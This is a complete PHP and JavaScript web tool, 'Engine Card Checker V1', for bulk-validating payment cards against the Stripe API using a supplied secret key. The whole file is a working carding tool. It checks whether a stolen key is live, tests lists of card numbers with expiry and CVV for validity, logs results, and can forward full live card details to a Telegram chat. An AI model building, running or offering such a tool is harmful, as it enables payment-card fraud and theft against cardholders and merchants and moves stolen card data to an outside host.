<?php
session_start();

// --- CONFIGURATION ---
$TELEGRAM_BOT_TOKEN = ""; // Optional: Your Telegram Bot Token
$TELEGRAM_CHAT_ID   = ""; // Optional: Your Telegram Chat ID
// ---------------------

// Handle AJAX API Requests
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
    $action = $_POST['action'];

    if ($action === 'check_sk') {
        $sk = trim($_POST['sk'] ?? '');
        $ch = curl_init('https://api.stripe.com/v1/account');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERPWD, $sk . ':');
        $res = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        $data = json_decode($res, true);
        if ($code === 200) {
            echo json_encode(['status' => 'LIVE', 'charges' => $data['charges_enabled'] ?? false]);
        } else {
            echo json_encode(['status' => 'DEAD', 'message' => $data['error']['message'] ?? 'Invalid Key']);
        }
        exit;
    }

    if ($action === 'check_card') {
        $sk = trim($_POST['sk'] ?? '');
        $card = trim($_POST['card'] ?? '');
        $parts = explode('|', $card);
        
        if (count($parts) !== 4) {
            echo json_encode(['status' => 'INVALID', 'msg' => 'Bad format']);
            exit;
        }
        list($num, $mm, $yyyy, $cvv) = $parts;

        $ch = curl_init('https://api.stripe.com/v1/payment_methods');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERPWD, $sk . ':');
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
            'type' => 'card',
            'card[number]' => $num,
            'card[exp_month]' => $mm,
            'card[exp_year]' => $yyyy,
            'card[cvc]' => $cvv
        ]));
        $res = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        $json = json_decode($res, true);
        $msg = $json['error']['message'] ?? 'Approved / Live';
        $status = ($code === 200) ? 'LIVE' : 'DEAD';

        // Auto-log to file
        $logDir = __DIR__ . '/logs';
        if (!is_dir($logDir)) mkdir($logDir, 0777, true);
        file_put_contents("$logDir/checker.log", "[" . date('Y-m-d H:i:s') . "] [$status] " . substr($num,0,6) . "xx | $msg\n", FILE_APPEND);

        // Optional Telegram Notification for Live cards
        if ($status === 'LIVE' && !empty($TELEGRAM_BOT_TOKEN) && !empty($TELEGRAM_CHAT_ID)) {
            $txt = urlencode("✅ *Live Card!*\n`$card`");
            @file_get_contents("https://api.telegram.org/bot{$TELEGRAM_BOT_TOKEN}/sendMessage?chat_id={$TELEGRAM_CHAT_ID}&text={$txt}&parse_mode=Markdown");
        }

        echo json_encode(['status' => $status, 'msg' => $msg]);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Engine Card Checker V1</title>
    <style>
        :root { --bg: #0f172a; --card: rgba(30, 41, 59, 0.7); --text: #f8fafc; --accent: #38bdf8; --border: rgba(255,255,255,0.1); --rose: #f43f5e; }
        body { background: var(--bg); color: var(--text); font-family: system-ui, sans-serif; margin: 0; padding: 20px; display: flex; justify-content: center; }
        .wrap { width: 100%; max-width: 650px; background: var(--card); backdrop-filter: blur(12px); border: 1px solid var(--border); padding: 25px; border-radius: 16px; box-shadow: 0 8px 32px rgba(0,0,0,0.3); }
        
        .header-brand {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 20px;
            background: rgba(255, 255, 255, 0.05);
            padding: 15px;
            border-radius: 12px;
            border: 1px solid var(--border);
        }
        .header-brand svg {
            width: 36px;
            height: 36px;
            fill: var(--rose);
            filter: drop-shadow(0 0 8px rgba(244, 63, 94, 0.4));
        }
        .header-brand h2 {
            margin: 0;
            font-size: 22px;
            font-weight: 900;
            color: #000000;
            letter-spacing: 0.5px;
            text-shadow: 0 1px 2px rgba(255, 255, 255, 0.3);
        }

        label { font-size: 13px; font-weight: bold; display: block; margin-top: 10px; }
        input, textarea { width: 100%; padding: 10px; margin-top: 5px; background: rgba(15, 23, 42, 0.6); border: 1px solid var(--border); color: #fff; border-radius: 8px; box-sizing: border-box; }
        textarea { height: 120px; resize: vertical; font-family: monospace; }
        button { width: 100%; background: var(--accent); color: #0f172a; border: none; padding: 12px; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 15px; }
        button:hover { opacity: 0.9; }
        .stats { display: flex; justify-content: space-between; margin: 15px 0; font-size: 14px; background: rgba(0,0,0,0.2); padding: 10px; border-radius: 8px; }
        .results { max-height: 200px; overflow-y: auto; background: rgba(0,0,0,0.3); border-radius: 8px; padding: 10px; font-family: monospace; font-size: 12px; }
        .log-live { color: #4ade80; }
        .log-dead { color: #f87171; }
    </style>
</head>
<body>
<div class="wrap">
    <div class="header-brand">
        <!-- Rose Colored Brain Logo SVG -->
        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 3c-4.97 0-9 4.03-9 9 0 2.12.74 4.07 1.97 5.61L4 20h4.39c.92.59 2.01.95 3.61.95s2.69-.36 3.61-.95H20l-.97-2.39C20.26 16.07 21 14.12 21 12c0-4.97-4.03-9-9-9zm0 2c3.87 0 7 3.13 7 7 0 1.66-.59 3.18-1.57 4.38l-.66.82h-1.61c-.55-.42-1.24-.7-2.16-.7s-1.61.28-2.16.7H8.84l-.66-.82C7.19 15.18 6.6 13.66 6.6 12c0-3.87 3.13-7 7-7zm-4.5 5a1.5 1.5 0 100 3 1.5 1.5 0 000-3zm9 0a1.5 1.5 0 100 3 1.5 1.5 0 000-3zm-4.5 2a1.5 1.5 0 100 3 1.5 1.5 0 000-3z"/>
        </svg>
        <h2>ENGINE CARD CHECKER V1</h2>
    </div>
    
    <label>Stripe Secret Key (sk_live_...)</label>
    <div style="display:flex; gap:10px;">
        <input type="password" id="sk" placeholder="sk_live_..." style="margin-top:5px;">
        <button onclick="checkSK()" style="width:120px; margin-top:5px;">Check SK</button>
    </div>

    <label>Card List (NUMBER|MM|YYYY|CVV)</label>
    <textarea id="cards" placeholder="4532140000000000|08|2028|123"></textarea>

    <button onclick="startCheck()" id="startBtn">START CHECKING</button>

    <div class="stats">
        <span>Live: <b id="cnt-live" style="color:#4ade80">0</b></span>
        <span>Dead: <b id="cnt-dead" style="color:#f87171">0</b></span>
        <span>Total: <b id="cnt-total">0</b></span>
    </div>

    <label>Live Output Logs</label>
    <div class="results" id="output"></div>
</div>

<script>
async function checkSK() {
    let sk = document.getElementById('sk').value.trim();
    if(!sk) return alert('Enter SK first');
    let fd = new FormData(); fd.append('action', 'check_sk'); fd.append('sk', sk);
    let res = await fetch('', {method:'POST', body:fd}).then(r => r.json());
    alert('SK Status: ' + res.status + (res.message ? ' ('+res.message+')' : ''));
}

async function startCheck() {
    let sk = document.getElementById('sk').value.trim();
    let rawCards = document.getElementById('cards').value.trim();
    if(!sk || !rawCards) return alert('Provide both SK and cards.');
    
    let cards = rawCards.split('\n').map(c => c.trim()).filter(c => c);
    let out = document.getElementById('output');
    let btn = document.getElementById('startBtn');
    
    btn.disabled = true;
    let live=0, dead=0;
    document.getElementById('cnt-total').innerText = cards.length;

    for(let card of cards) {
        let fd = new FormData();
        fd.append('action', 'check_card');
        fd.append('sk', sk);
        fd.append('card', card);
        
        try {
            let res = await fetch('', {method:'POST', body:fd}).then(r => r.json());
            let cls = res.status === 'LIVE' ? 'log-live' : 'log-dead';
            if(res.status === 'LIVE') live++; else dead++;
            
            document.getElementById('cnt-live').innerText = live;
            document.getElementById('cnt-dead').innerText = dead;
            
            out.innerHTML = `<div class="${cls}">[${res.status}] ${card} — ${res.msg}</div>` + out.innerHTML;
        } catch(e) {
            out.innerHTML += `<div class="log-dead">[ERROR] Network failure for ${card}</div>`;
        }
        await new Promise(r => setTimeout(r, 800)); // 800ms delay between checks
    }
    btn.disabled = false;
}
</script>
</body>
</html>